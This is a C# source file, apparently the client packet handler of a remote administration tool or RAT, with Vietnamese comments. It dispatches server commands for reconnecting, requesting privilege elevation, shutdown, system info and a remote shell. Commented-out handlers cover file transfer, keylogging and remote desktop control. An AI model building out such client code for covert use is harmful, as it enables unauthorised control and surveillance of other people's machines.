using Client.Networking.Handlers;
using Client.Networking.Packets.ClientServices;
//using Client.Networking.Packets.FileManager;
//using Client.Networking.Packets.MessageBox;
//using Client.Networking.Packets.RemoteDesktop;
using Client.Networking.Packets.RemoteShell;
//using Client.Networking.Packets.TaskManager;
using Common.Networking.Packets;

namespace Client.Networking
{
    public class ClientHandler : IDisposable
    {
        private readonly Client _client;
        private readonly FrmMain _application;

        private readonly ClientServicesHandler _clientServicesHandler;
        private readonly SystemInfoHandler _systemInfoHandler;
        private readonly RemoteShellHandler _remoteShellHandler;
        //private readonly TaskManagerHandler _taskManagerHandler;
        //private readonly FileManagerHandler _fileManagerHandler;
        //private readonly MessageBoxHandler _messageBoxHandler;
        //private readonly KeyloggerHandler _keyloggerHandler;
        //private readonly RemoteDesktopHandler _remoteDesktopHandler;

        public ClientHandler(FrmMain application, Client client)
        {
            _application = application;
            _client = client;

            _clientServicesHandler = new(_application, client);
            _systemInfoHandler = new(client);
            _remoteShellHandler = new(client);
            //_taskManagerHandler = new(client);
            //_fileManagerHandler = new(client);
            //_messageBoxHandler = new(client);
            //_keyloggerHandler = new(client);
            //_remoteDesktopHandler = new(client);
        }

        //xử lý gói tin (packet) mà client nhận được từ server.
        public async Task HandlePackets(int id, byte[] data)
        {
            try
            {
                switch (id)
                {
                    case 0x04:
                        _ = _clientServicesHandler.Reconnect();
                        break;
                    case 0x05:
                        _ = _clientServicesHandler.Disconnect();
                        break;
                    case 0x06:
                        _ = _clientServicesHandler.AskElevate();
                        break;
                    case 0x07:
                        _ = _clientServicesHandler.ShutdownActionHandler(ResponsePacket.Deserialize<ShutdownActionPacket>(data));
                        break;
                    // System Info
                    case 0x10:
                        _ = _systemInfoHandler.GetInfo();
                        break;
                        //Remote Shell
                    case 0x20:
                        _ = _remoteShellHandler.SendCommand(ResponsePacket.Deserialize<RemoteShellPacket>(data));
                        break;
                    //// Task Manager
                    //case 0x30:
                    //    _ = _taskManagerHandler.GetProcesses();
                    //    break;
                    //case 0x31:
                    //    _ = _taskManagerHandler.ActionProcess(ResponsePacket.Deserialize<ProcessActionPacket>(data));
                    //    break;
                    //// File Manager
                    //case 0x41:
                    //    _ = _fileManagerHandler.GetDrives();
                    //    break;
                    //case 0x42:
                    //    _ = _fileManagerHandler.GetDirectory(ResponsePacket.Deserialize<GetDirectoryPacket>(data));
                    //    break;
                    //case 0x43:
                    //    _ = _fileManagerHandler.PathRename(ResponsePacket.Deserialize<PathRenamePacket>(data));
                    //    break;
                    //case 0x44:
                    //    _ = _fileManagerHandler.PathDelete(ResponsePacket.Deserialize<PathDeletePacket>(data));
                    //    break;
                    //case 0x45:
                    //    _ = _fileManagerHandler.FileTransferRequest(ResponsePacket.Deserialize<FileTransferRequestPacket>(data));
                    //    break;
                    //case 0x46:
                    //    break;
                    //case 0x47:
                    //    _ = _fileManagerHandler.FileTransferCancel(ResponsePacket.Deserialize<FileTransferCancelPacket>(data));
                    //    break;
                    //case 0x48:
                    //    _ = _fileManagerHandler.FileTransferChunk(ResponsePacket.Deserialize<FileTransferChunkPacket>(data));
                    //    break;
                    //// Message Box
                    //case 0x50:
                    //    _ = _messageBoxHandler.ShowMessageBox(ResponsePacket.Deserialize<ShowMessageBoxPacket>(data));
                    //    break;
                    //// Keylogger
                    //case 0x60:
                    //    _ = _keyloggerHandler.GetKeyloggerLogsDirectory();
                    //    break;
                    //// Remote Desktop
                    //case 0x70:
                    //    _ = _remoteDesktopHandler.GetDesktop(ResponsePacket.Deserialize<GetDesktopPacket>(data));
                    //    break;
                    //case 0x71:
                    //    _ = _remoteDesktopHandler.GetMonitors();
                    //    break;
                    //case 0x72:
                    //    _ = _remoteDesktopHandler.MouseEvent(ResponsePacket.Deserialize<MouseEventPacket>(data));
                    //    break;
                    //case 0x73:
                    //    _ = _remoteDesktopHandler.KeyboardEvent(ResponsePacket.Deserialize<KeyboardEventPacket>(data));
                    //    break;
                    default:
                        break;
                }
            }
            catch (Exception e)
            {

            }
        }

        public void Dispose()
        {
            _clientServicesHandler?.Dispose();
            _systemInfoHandler?.Dispose();
            _remoteShellHandler?.Dispose();
            //_taskManagerHandler?.Dispose();
            //_fileManagerHandler?.Dispose();
            //_messageBoxHandler?.Dispose();
            //_keyloggerHandler?.Dispose();
            //_remoteDesktopHandler?.Dispose();

            GC.SuppressFinalize(this);
        }
    }
}
